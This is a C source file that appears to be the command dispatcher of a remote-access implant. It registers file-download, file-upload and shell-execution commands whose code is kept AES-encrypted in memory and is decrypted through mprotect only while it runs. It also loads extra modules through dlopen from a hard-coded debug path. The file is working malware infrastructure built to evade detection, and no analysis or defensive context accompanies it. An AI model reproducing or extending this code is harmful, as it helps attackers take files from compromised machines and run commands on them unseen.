#include "commands.h"

typedef buffer (*command_type)(result *, buffer *);

typedef struct command_definition_s {
    command_type command_address;
    const unsigned char *command_start_address;
    const unsigned char *command_end_address;
    uint64_t command_id;
} command_definition;

command_definition *commands = NULL;

size_t commands_number = 0;

result initialize_commands() {
    INITIALIZE_RESULT(res);

    commands = (command_definition *) malloc_f(sizeof(command_definition) * 3);
    if (commands == NULL) {
        HANDLE_ERROR(res, FAILED_MALLOC, "Failed allocating commands", NULL)
    }

    commands[0].command_address = get_file;
    extern unsigned char *__get_file_start;
    extern unsigned char *__get_file_end;
    commands[0].command_start_address = (const unsigned char *) &__get_file_start;
    commands[0].command_end_address = (const unsigned char *) &__get_file_end;
    commands[0].command_id = GET_FILE_COMMAND_ID;

    commands[1].command_address = put_file;
    extern unsigned char *__put_file_start;
    extern unsigned char *__put_file_end;
    commands[1].command_start_address = (const unsigned char *) &__put_file_start;
    commands[1].command_end_address = (const unsigned char *) &__put_file_end;
    commands[1].command_id = PUT_FILE_COMMAND_ID;

    commands[2].command_address = run_shell;
    extern unsigned char *__run_shell_start;
    extern unsigned char *__run_shell_end;
    commands[2].command_start_address = (const unsigned char *) &__run_shell_start;
    commands[2].command_end_address = (const unsigned char *) &__run_shell_end;
    commands[2].command_id = RUN_SHELL_COMMAND_ID;

    commands_number = 3;

    error_cleanup:

    return res;
}

void add_command(result *res, const char *module_path) {
    void *handle = dlopen("/c/projects/iron-man/c/cmake-build-debug/libsum.so", RTLD_LAZY);
    if (!handle) {
        HANDLE_ERROR((*res), FAILED_DLOPEN, "Failed opening shared object %s", dlerror())
    }
    buffer (*chosen_command)(result *, buffer *) = NULL;
    int *(*eee)(void) = NULL;
    eee = dlsym(handle, "__errno_location");

    result (*module_constructor)() = NULL;
    void (*module_destructor)() = NULL;
    module_constructor = dlsym(handle, string_module_constructor);
    module_destructor = dlsym(handle, string_module_destructor);

    *res = module_constructor();
    HANDLE_ERROR_RESULT((*res))

    chosen_command = dlsym(handle, string_run);
    if (chosen_command == NULL) {
        HANDLE_ERROR((*res), FAILED_DLSYM, "Failed loading symbol %s", "run")
    }

    INITIALIZE_BUFFER(b);
    b = create_buffer(res, 8);
    write_unsigned_int(res, &b, 4);
    write_unsigned_int(res, &b, 4);
    b.position = 0;
    buffer t = chosen_command(res, &b);
    module_destructor();
    dlclose(handle);

    error_cleanup:

    return;
}

void destroy_commands() {
    free_f(commands);
    commands = NULL;
    commands_number = 0;
}

size_t round_up(size_t num, size_t multiple) {
    return ((num / multiple) + (num % multiple ? 1 : 0)) * multiple;
}

size_t round_down(size_t num, size_t multiple) {
    return (num / multiple) * multiple;
}

result xcrypt_command(const char *key, const char *iv, const unsigned char *start_address,
                      const unsigned char *end_address) {
    INITIALIZE_RESULT(res);
    struct AES_ctx command_ctx;
    AES_init_ctx_iv(&command_ctx, (const uint8_t *) key, (const uint8_t *) iv);

    size_t pagesize = sysconf_f(_SC_PAGE_SIZE);
    if (pagesize == -1) {
        HANDLE_ERROR(res, FAILED_SYSCONF, "Failed getting page size", NULL)
    }

    void *start_address_p = (void *) round_down((size_t) start_address, pagesize);
    size_t section_size = round_up((size_t) end_address, pagesize) - round_down((size_t) start_address, pagesize);
    if (mprotect_f(start_address_p, section_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        HANDLE_ERROR(res, FAILED_MPROTECT, "Failed changing code protection", NULL)
    }

    AES_CTR_xcrypt_buffer(&command_ctx, (uint8_t *) start_address, end_address - start_address);

    if (mprotect_f(start_address_p, section_size, PROT_READ | PROT_EXEC) == -1) {
        HANDLE_ERROR(res, FAILED_MPROTECT, "Failed changing code protection", NULL)
    }

    goto cleanup;

    error_cleanup:

    cleanup:

    return res;
}

buffer run_command(result *res, uint64_t command_id, const char *key, const char *iv, buffer *buf) {
    WRITE_LOG(INFO, "Running command: %llx", command_id)

    INITIALIZE_BUFFER(buf_out);
    INITIALIZE_RESULT(tmp_res);

    command_definition *chosen_command = NULL;

    for (size_t command_index = 0; command_index < commands_number; command_index++) {
        if (command_id == commands[command_index].command_id) {
            chosen_command = &commands[command_index];
            break;
        }
    }

    if (chosen_command == NULL) {
        HANDLE_ERROR((*res), UNKNOWN_COMMAND, "Unknown command: %llx", command_id)
    }

    *res = xcrypt_command(key, iv, chosen_command->command_start_address, chosen_command->command_end_address);
    HANDLE_ERROR_RESULT((*res))

    buf_out = chosen_command->command_address(res, buf);
    HANDLE_ERROR_RESULT((*res))

    WRITE_LOG(INFO, "Finished running command: %llx", command_id)

    goto cleanup;

    error_cleanup:

    destroy_buffer(&buf_out);

    cleanup:

    tmp_res = xcrypt_command(key, iv, chosen_command->command_start_address, chosen_command->command_end_address);
    if (RESULT_SUCCEEDED((*res))) {
        *res = tmp_res;
    }

    return buf_out;
}
